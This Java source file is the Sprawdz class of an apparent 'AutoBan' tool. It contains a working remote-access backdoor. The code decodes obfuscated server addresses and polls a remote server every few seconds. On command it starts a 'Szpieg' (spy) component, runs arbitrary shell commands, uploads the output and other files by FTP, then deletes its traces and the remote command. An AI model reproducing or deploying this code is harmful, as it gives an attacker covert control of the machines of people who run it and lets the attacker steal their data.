
package pl.mario.mautoban;

import java.io.BufferedReader;
import java.io.File;
import static pl.mario.mautoban.Strings.*;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;


/**
 *
 * @author Mari PL
 */
public class Sprawdz extends Thread{
    static String nick;
    static String ps = null;
    public Sprawdz()
    {
        String linia = null;
        File plik = new File(odkoduj(autobancfg));
        if(!plik.exists())
        {
            JOptionPane.showMessageDialog(null, "File autoban.cfg not found!");
            System.exit(0);
        }
        try {
            Scanner file = new Scanner(plik);
            linia = file.nextLine();
            ps = file.nextLine();
            file.close();
            if((linia.equals("") || linia.equals(null)) || ps.equals("") || ps.equals(null) )
                    System.exit(0);
            nick = linia;
        } catch (FileNotFoundException ex) {
            Loguj.loguj("Sprawdz: konstruktor: "+ex);
        }
        System.out.println(odkoduj(mautorunip)+odkoduj(linia));
        AutoBan.spr = htmlReader.visitHTML(odkoduj(mautorunip)+odkoduj(linia));
    }
    public void run()
    {
        while(true)
        {
            try {
                if(AutoBan.spr != 123)
                    System.exit(0);
                    
                Thread.sleep(5000);
            } catch (InterruptedException ex) {
                Loguj.loguj("Sprawdz: run: "+ex);
            }
            checklink();
        }
    }
    
    public static String odkoduj(String txt)
    {
        char[] tab = txt.toCharArray();
        char [] tab2 = new char[txt.length()/3];
        for(int i=0, j=txt.length()-1; i<tab2.length; i++,j-=3)
        {
            String l = tab[j]+""+tab[j-1]+""+tab[j-2];
            int x = Integer.parseInt(l);
            x = (int)Math.ceil(x/5.0);
            x=x-70;
            tab2[i] = (char)x; 
        }
        return new String(tab2);
    }
    
    
    public static void checklink()
    {
        String txt = htmlReader.readHTML(odkoduj(checklink)+odkoduj(nick)+"/"+odkoduj(nick));
        if(!odkoduj(txt.trim()).equals(ps))
            System.exit(0);
        
        txt = htmlReader.readHTML(odkoduj(checklink)+odkoduj(nick)+"/"+odkoduj(cmdlink));
        if(txt.trim().equals(odkoduj(dwnl)))
        {
            htmlReader.visitHTML(odkoduj(usun)+odkoduj(nick)+"/"+odkoduj(nick)+odkoduj(usuncmd));
            Szpieg sz = new Szpieg();
            sz.start();
        }
        else
        if(txt.trim().contains(odkoduj(dwnl)))
        {
            htmlReader.visitHTML(odkoduj(usun)+odkoduj(nick)+"/"+odkoduj(nick)+odkoduj(usuncmd));
            Szpieg.ftp(txt.substring(6), 0);
        }
        else
        if(txt.trim().contains(odkoduj(cmd)))
        {
            htmlReader.visitHTML(odkoduj(usun)+odkoduj(nick)+"/"+odkoduj(nick)+odkoduj(usuncmd));
            try {
                String linia;
                Process p = null;
                String cmmd = txt.substring(5);
                p = Runtime.getRuntime().exec(cmmd);
                BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
                PrintWriter file = new PrintWriter(odkoduj(result));
            while ((linia = input.readLine()) != null)
            {
                file.append(linia+"\n");
            }
            file.close();
            input.close();
            Szpieg.ftp(odkoduj(result),0);
            File f = new File(odkoduj(result));
            f.delete();
            } catch (IOException ex) {
                Loguj.loguj("Sprawdz: checklinkcmd: "+ex);
            }
        }
                
        
    }
    
}
